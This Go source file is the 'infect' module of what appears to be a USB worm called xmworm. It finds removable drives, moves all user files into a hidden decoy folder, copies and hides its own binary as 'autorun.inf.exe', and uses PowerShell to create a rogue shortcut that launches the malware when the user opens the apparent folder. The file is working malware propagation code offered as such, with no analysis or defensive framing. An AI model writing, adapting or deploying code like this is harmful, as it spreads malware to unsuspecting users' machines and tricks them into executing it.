package infect

import (
	"fmt"
	"log"
	"os"
	"strings"
	"sync"

	drv "github.com/0/xmworm/drives"
	fl "github.com/0/xmworm/files"
	sh "github.com/0/xmworm/shell"
)

const (
	binName = "autorun.inf.exe"
)

func Infect(execPathname string) {

	logger := log.New(os.Stdout, "Infect(): ", log.LstdFlags)
	logger.Printf("Binary work dir: %s\n", execPathname)

	logger.Println("Scanning All drives on your system")
	drives := drv.ScanDrivesEx()
	logger.Printf("%v\n", drives)

	logger.Println("Filtering only removable drives to infect")
	removableDrives := drv.ScanRemovableDrivesEx(drives)
	logger.Printf("%v\n", removableDrives)

	for _, drive := range removableDrives {

		relocateFilesInDrive(drive)

		shouldInfect := true
		dst_pathname := fmt.Sprintf(`%s\%s`, drive.Name(), binName)

		files := drive.ListFilesEx()

		// Don't infect drive if already infected
		for _, file := range files {
			if file == binName {
				shouldInfect = false
				break
			}
		}

		if shouldInfect {

			// Move all files in drive to decoyFolder, and hide decoyFolder
			decoyFolder := relocateFilesInDrive(drive)
			HideFile(decoyFolder)

			// Malware copies and hides itself to drive
			logger.Printf("Copying %s to %s\n", execPathname, dst_pathname)
			fl.Copy(execPathname, dst_pathname)
			logger.Printf("Done copying\n")
			HideFile(dst_pathname)

			// Create Rogue Lnk for decoyFolder
			InfectFile(dst_pathname, decoyFolder)
		} else {
			logger.Printf("Drive %s is already infected\n", drive.Name())
		}

	}

}

func relocateFilesInDrive(drive drv.Drive) (decoyFolder string) {
	name := "relocateFilesInDrive()"
	// Create directory
	driveLetter := strings.Split(drive.Name(), ":")[0]
	target := fmt.Sprintf(`%sDisque %s`, drive.Name(), driveLetter)
	log.Printf("%s: target = %s", name, target)
	_, err := os.Stat(target)
	if os.IsNotExist(err) {
		log.Printf("Creating decoy dir: %s", target)

		err = os.Mkdir(target, 0755)
		if err != nil {
			log.Printf("could not create dir %v", err)
			return
		}
	}

	var wg sync.WaitGroup
	batchsize := 10

	//Move files to that directory
	files := drive.ListFilesEx()
	total := len(files)

	for i := 0; i < total; i += batchsize {
		limit := batchsize
		if (i + limit) > total {
			limit = total - i
		}
		wg.Add(limit)
		for j := i; j < i+limit; j++ {
			filename := files[j]
			go func(filename string) {
				defer wg.Done()
				if filename != fmt.Sprintf(`Disque %s`, driveLetter) && filename != `System Volume Information` {
					old := fmt.Sprintf(`%s%s`, drive.Name(), filename)
					new := fmt.Sprintf(`%s\%s`, target, filename)
					err = os.Rename(old, new)
					if err != nil {
						// probably failed to move this file
						log.Println(err)
					}
					log.Printf("Moved %s to %s", old, new)
				}
			}(filename)
		}
		wg.Wait()
		log.Println("batch #", i, " done")
	}

	decoyFolder = target
	return
}

func InfectFile(execPathname string, file string) {
	fileLnk := fl.NewLnk(execPathname, file)
	fmt.Printf("Infecting %s --> %s\n", file, fileLnk.Name())
	// Infecting means creating the actual lnk file on the system
	// which points to the malicious binary.
	sh.Run(fileLnk.Cmd(), "powershell")
}

func HideFile(file string) {
	cmd := fmt.Sprintf(`attrib +h "%s"`, file)
	sh.Run(cmd, "powershell")
}
